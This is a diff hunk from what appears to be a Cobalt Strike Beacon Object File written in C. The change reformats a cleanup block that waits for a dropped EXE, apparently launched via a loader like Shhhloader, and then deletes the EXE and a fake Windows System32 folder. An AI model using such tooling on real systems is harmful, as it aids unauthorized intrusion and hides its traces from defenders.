@@ -290,24 +290,24 @@ int go(char * args, unsigned long length) {
     // Set this sleep to be for however long the EXE will execute for. 30 seconds is a good standard for use with something like Shhhloader.
     KERNEL32$Sleep(30000);
 
-    FileCleanup:
-    // delete exe from created directory
-    int result = KERNEL32$DeleteFileA(targetBinLocation);
-    if (result != 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "File deleted succesfully: %s\n", targetBinLocation);
-    }
-    else {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, KERNEL32$GetLastError());
-    }
+    FileCleanup: ;
+        // delete exe from created directory
+        int result = KERNEL32$DeleteFileA(targetBinLocation);
+        if (result != 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "File deleted succesfully: %s\n", targetBinLocation);
+        }
+        else {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, KERNEL32$GetLastError());
+        }
 
-    // delete created directory
-    result = KERNEL32$RemoveDirectoryA(tempSystem32);
-    if (result != 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Folder deleted succesfully: %s\n", tempSystem32);
-    }
-    else {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %s: %d\n", tempSystem32, KERNEL32$GetLastError());
-    }
+        // delete created directory
+        result = KERNEL32$RemoveDirectoryA(tempSystem32);
+        if (result != 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "Folder deleted succesfully: %s\n", tempSystem32);
+        }
+        else {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %s: %d\n", tempSystem32, KERNEL32$GetLastError());
+        }
 
     return 0;
 }
